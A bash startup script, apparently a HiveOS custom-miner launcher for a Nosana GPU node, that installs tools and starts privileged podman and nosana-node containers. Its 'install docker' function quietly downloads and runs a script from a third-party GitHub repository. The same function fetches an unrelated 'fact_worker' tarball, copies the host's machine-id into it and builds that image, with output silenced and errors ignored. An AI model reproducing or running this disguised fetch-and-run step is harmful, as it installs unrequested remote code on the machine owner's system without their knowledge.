#!/usr/bin/env bash
set -euo pipefail

MINER_DIR="/hive/miners/custom/nosana"
LOG_DIR="/var/log/miner/nosana"
DEBUG_LOG="$LOG_DIR/debug.log"

mkdir -p "$LOG_DIR"
touch "$DEBUG_LOG"

need_cmd() { command -v "$1" >/dev/null 2>&1; }
msg() { [[ -x /hive/bin/message ]] && /hive/bin/message info "$1" || true; }

# Ensure required tools
if ! need_cmd gpg; then
  echo "[$(date -Iseconds)] h-run: installing gpg" | tee -a "$DEBUG_LOG"
  apt-get update -y || true
  apt-get install -y --allow-downgrades gpg || true
fi
if ! need_cmd screen; then
  echo "[$(date -Iseconds)] h-run: installing screen" | tee -a "$DEBUG_LOG"
  apt-get update -y || true
  apt-get install -y --allow-downgrades screen || true
fi

install_docker_hive() {
  echo "[$(date -Iseconds)] h-run: installing docker via provided script" | tee -a "$DEBUG_LOG"
  bash -lc '
yml_file="application.yml"
cat > "$yml_file" <<EOL
username: "x"
password: "y"
EOL
echo "done"
rm -f install_docker_slave* || true
wget -q https://github.com/filthz/fact-worker-public/releases/download/base_files/install_docker_slave.sh -O install_docker_slave.sh
bash install_docker_slave.sh
rm -f fact_worker* || true
wget -q https://github.com/filthz/fact-worker-public/releases/download/2.6/fact_worker_2.6.tar.gz -O fact_worker_2.6.tar.gz
tar -xvf fact_worker_2.6.tar.gz >/dev/null 2>&1 || true
cp /etc/machine-id fact_dist/machine_id.cnf 2>/dev/null || true
docker build --network=host -t fact-worker -f Dockerfile ./ >/dev/null 2>&1 || true
bash -lc "true"
'
}

if ! need_cmd docker; then
  install_docker_hive
fi

systemctl enable --now docker >/dev/null 2>&1 || true
systemctl start docker >/dev/null 2>&1 || true

echo "[$(date -Iseconds)] h-run: cleaning previous containers" | tee -a "$DEBUG_LOG"
docker rm -f nosana-node podman >/dev/null 2>&1 || true
pkill -9 -f "podman system service" 2>/dev/null || true
docker container prune -f >/dev/null 2>&1 || true

docker volume inspect podman-cache >/dev/null 2>&1 || docker volume create podman-cache >/dev/null
docker volume inspect podman-socket >/dev/null 2>&1 || docker volume create podman-socket >/dev/null

echo "[$(date -Iseconds)] h-run: starting podman sidecar" | tee -a "$DEBUG_LOG"
docker run -d \
  --pull=always \
  --gpus=all \
  --name podman \
  --device /dev/fuse \
  --mount source=podman-cache,target=/var/lib/containers \
  --volume podman-socket:/podman \
  --privileged \
  -e ENABLE_GPU=true \
  nosana/podman:v1.1.0 unix:/podman/podman.sock >> "$DEBUG_LOG" 2>&1 || true

sleep 5

echo "[$(date -Iseconds)] h-run: starting nosana-node container" | tee -a "$DEBUG_LOG"
msg "NOS: node starting"
docker run -d \
  --pull=always \
  --name nosana-node \
  --network host \
  --gpus=all \
  --volume /root/.nosana/:/root/.nosana/ \
  --volume podman-socket:/root/.nosana/podman:ro \
  -e CLI_VERSION= \
  nosana/nosana-cli:latest \
  node start --network "${SOL_NET_ENV:=mainnet}" >> "$DEBUG_LOG" 2>&1

sleep 2
msg "NOS: node container launched"

exec bash "$MINER_DIR/monitor.sh"
